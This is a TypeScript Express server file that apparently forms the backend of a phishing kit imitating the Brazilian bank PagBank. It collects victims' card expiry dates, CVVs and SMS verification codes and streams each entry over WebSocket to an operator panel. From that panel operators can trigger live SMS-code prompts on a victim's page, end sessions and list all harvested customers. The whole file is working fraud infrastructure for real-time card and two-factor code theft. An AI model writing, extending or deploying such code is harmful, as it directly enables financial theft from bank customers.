import type { Express } from "express";
import { SessionData } from "express-session";

// Extend SessionData interface to add our custom properties
declare module "express-session" {
  interface SessionData {
    customerId?: string;
    document?: string;
    adminId?: string;
    adminUsername?: string;
  }
}
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import session from "express-session";
import connectPgSimple from "connect-pg-simple";
import { db, pool } from "@db";
import { storage } from "./storage";
import { eq } from "drizzle-orm";
import { customers, admins } from "@shared/schema";

// Define WebSocket message types
type WSMessage = {
  type: string;
  data: any;
};

// Map to store client WebSockets by session ID
const clientSockets = new Map<string, WebSocket>();
// Map to store admin WebSockets
const adminSockets = new Set<WebSocket>();

// Handle WebSocket connections
const setupWebSocket = (server: Server) => {
  const wss = new WebSocketServer({ server, path: '/ws' });

  wss.on('connection', (ws: WebSocket, req) => {
    console.log('WebSocket client connected');

    // Store session ID with WebSocket connection
    // This will be set when the client authenticates via API
    let sessionId: string | null = null;
    let isAdmin = false;

    ws.on('message', async (message: string) => {
      try {
        const parsedMessage: WSMessage = JSON.parse(message);
        console.log('Received message:', parsedMessage.type);

        // Handle different message types
        switch (parsedMessage.type) {
          case 'AUTH':
            sessionId = parsedMessage.data.sessionId;
            isAdmin = parsedMessage.data.isAdmin || false;
            
            if (sessionId) {
              if (isAdmin) {
                adminSockets.add(ws);
                console.log('Admin socket registered');
              } else {
                clientSockets.set(sessionId, ws);
                console.log('Client socket registered for session:', sessionId);
              }
            }
            break;

          case 'CARD_AUTH':
            // Process card data and forward to admin
            if (sessionId) {
              const { expiryDate, cvv } = parsedMessage.data;
              
              // Update customer with card info
              await storage.updateCustomerCardInfo(sessionId, expiryDate, cvv);
              
              // Broadcast to all admin clients
              const customerData = await storage.getCustomerBySessionId(sessionId);
              if (customerData) {
                broadcastToAdmins({
                  type: 'CUSTOMER_UPDATE',
                  data: customerData
                });
              }
            }
            break;

          case 'SMS_CODE':
            // Process SMS code and forward to admin
            if (sessionId) {
              const { code } = parsedMessage.data;
              
              // Update customer with SMS code
              await storage.updateCustomerSmsCode(sessionId, code);
              
              // Broadcast to all admin clients
              const customerData = await storage.getCustomerBySessionId(sessionId);
              if (customerData) {
                broadcastToAdmins({
                  type: 'CUSTOMER_UPDATE',
                  data: customerData
                });
              }
            }
            break;

          case 'REQUEST_SMS':
            // Admin requests SMS verification
            if (isAdmin) {
              const { customerId } = parsedMessage.data;
              const customer = await storage.getCustomerById(customerId);
              
              if (customer && customer.sessionId) {
                const clientWs = clientSockets.get(customer.sessionId);
                
                if (clientWs && clientWs.readyState === WebSocket.OPEN) {
                  clientWs.send(JSON.stringify({
                    type: 'REQUEST_SMS'
                  }));
                  
                  // Update status
                  await storage.updateCustomerStatus(customerId, 'awaiting_sms');
                  
                  // Broadcast updated customer to admins
                  const updatedCustomer = await storage.getCustomerById(customerId);
                  if (updatedCustomer) {
                    broadcastToAdmins({
                      type: 'CUSTOMER_UPDATE',
                      data: updatedCustomer
                    });
                  }
                }
              }
            }
            break;

          case 'FINISH_SESSION':
            // Admin finishes the session
            if (isAdmin) {
              const { customerId } = parsedMessage.data;
              const customer = await storage.getCustomerById(customerId);
              
              if (customer && customer.sessionId) {
                const clientWs = clientSockets.get(customer.sessionId);
                
                if (clientWs && clientWs.readyState === WebSocket.OPEN) {
                  clientWs.send(JSON.stringify({
                    type: 'FINISH_SESSION'
                  }));
                  
                  // Update status
                  await storage.updateCustomerStatus(customerId, 'completed');
                  
                  // Broadcast updated customer to admins
                  const updatedCustomer = await storage.getCustomerById(customerId);
                  if (updatedCustomer) {
                    broadcastToAdmins({
                      type: 'CUSTOMER_UPDATE',
                      data: updatedCustomer
                    });
                  }
                }
              }
            }
            break;
        }
      } catch (error) {
        console.error('Error processing WebSocket message:', error);
      }
    });

    ws.on('close', () => {
      console.log('WebSocket client disconnected');
      
      if (sessionId) {
        if (isAdmin) {
          adminSockets.delete(ws);
        } else {
          clientSockets.delete(sessionId);
        }
      }
    });
  });

  return wss;
};

// Broadcast message to all admin clients
const broadcastToAdmins = (message: WSMessage) => {
  adminSockets.forEach(socket => {
    if (socket.readyState === WebSocket.OPEN) {
      socket.send(JSON.stringify(message));
    }
  });
};

export async function registerRoutes(app: Express): Promise<Server> {
  // Configure session middleware with PostgreSQL store
  const PgSession = connectPgSimple(session);
  
  app.use(
    session({
      store: new PgSession({
        pool: pool,
        tableName: 'sessions',
        createTableIfMissing: true
      }),
      secret: process.env.SESSION_SECRET || 'pagbank-session-secret',
      resave: false,
      saveUninitialized: false,
      cookie: {
        maxAge: 30 * 60 * 1000, // 30 minutes
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true
      }
    })
  );

  // Create HTTP server
  const httpServer = createServer(app);
  
  // Setup WebSocket server
  const wss = setupWebSocket(httpServer);

  // API Routes
  
  // Auth endpoints
  app.post('/api/auth/login', async (req, res) => {
    try {
      const { document } = req.body;
      
      if (!document) {
        return res.status(400).json({ message: 'Document is required' });
      }
      
      // Find customer by document
      const customer = await storage.getCustomerByDocument(document);
      
      if (!customer) {
        return res.status(404).json({ message: 'User not found' });
      }
      
      // Save customer in session
      req.session.customerId = customer.id;
      req.session.document = document;
      
      // Update customer with session ID
      await storage.updateCustomerSessionId(customer.id, req.sessionID);
      
      return res.status(200).json({ success: true });
    } catch (error) {
      console.error('Login error:', error);
      return res.status(500).json({ message: 'Internal server error' });
    }
  });
  
  app.post('/api/auth/logout', (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        console.error('Logout error:', err);
        return res.status(500).json({ message: 'Failed to logout' });
      }
      
      res.clearCookie('connect.sid');
      return res.status(200).json({ success: true });
    });
  });
  
  // User data endpoints
  app.get('/api/user/data', async (req, res) => {
    try {
      if (!req.session.customerId) {
        return res.status(401).json({ message: 'Unauthorized' });
      }
      
      const customer = await storage.getCustomerById(req.session.customerId);
      
      if (!customer) {
        return res.status(404).json({ message: 'Customer not found' });
      }
      
      // Return relevant user data
      return res.status(200).json({
        name: customer.name,
        document: customer.document,
        formattedDocument: customer.formattedDocument,
        cardNumber: customer.cardNumber,
        maskedCardNumber: customer.maskedCardNumber
      });
    } catch (error) {
      console.error('Error fetching user data:', error);
      return res.status(500).json({ message: 'Internal server error' });
    }
  });
  
  app.post('/api/user/card-auth', async (req, res) => {
    try {
      if (!req.session.customerId) {
        return res.status(401).json({ message: 'Unauthorized' });
      }
      
      const { expiryDate, cvv } = req.body;
      
      if (!expiryDate || !cvv) {
        return res.status(400).json({ message: 'Expiry date and CVV are required' });
      }
      
      // Update customer with card info
      await storage.updateCustomerCardInfo(req.sessionID, expiryDate, cvv);
      
      // Update status to awaiting_confirmation
      await storage.updateCustomerStatus(req.session.customerId, 'awaiting_confirmation');
      
      return res.status(200).json({ success: true });
    } catch (error) {
      console.error('Error updating card info:', error);
      return res.status(500).json({ message: 'Internal server error' });
    }
  });
  
  app.post('/api/user/verify-sms', async (req, res) => {
    try {
      if (!req.session.customerId) {
        return res.status(401).json({ message: 'Unauthorized' });
      }
      
      const { code } = req.body;
      
      if (!code) {
        return res.status(400).json({ message: 'SMS code is required' });
      }
      
      // Update customer with SMS code
      await storage.updateCustomerSmsCode(req.sessionID, code);
      
      return res.status(200).json({ success: true });
    } catch (error) {
      console.error('Error verifying SMS code:', error);
      return res.status(500).json({ message: 'Internal server error' });
    }
  });
  
  // Admin endpoints
  app.post('/api/admin/login', async (req, res) => {
    try {
      const { username, password } = req.body;
      
      if (!username || !password) {
        return res.status(400).json({ message: 'Username and password are required' });
      }
      
      // Find admin by username
      const admin = await db.query.admins.findFirst({
        where: eq(admins.username, username)
      });
      
      if (!admin || admin.password !== password) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }
      
      // Save admin in session
      req.session.adminId = admin.id;
      req.session.adminUsername = admin.username;
      
      return res.status(200).json({ success: true });
    } catch (error) {
      console.error('Admin login error:', error);
      return res.status(500).json({ message: 'Internal server error' });
    }
  });
  
  app.post('/api/admin/logout', (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        console.error('Admin logout error:', err);
        return res.status(500).json({ message: 'Failed to logout' });
      }
      
      res.clearCookie('connect.sid');
      return res.status(200).json({ success: true });
    });
  });
  
  app.get('/api/admin/check-auth', (req, res) => {
    if (!req.session.adminId) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    return res.status(200).json({ 
      success: true,
      username: req.session.adminUsername
    });
  });
  
  app.get('/api/admin/customers', async (req, res) => {
    try {
      if (!req.session.adminId) {
        return res.status(401).json({ message: 'Unauthorized' });
      }
      
      // Get all customers
      const customerList = await db.query.customers.findMany({
        orderBy: (customers, { desc }) => [desc(customers.updatedAt)]
      });
      
      return res.status(200).json(customerList);
    } catch (error) {
      console.error('Error fetching customers:', error);
      return res.status(500).json({ message: 'Internal server error' });
    }
  });

  return httpServer;
}
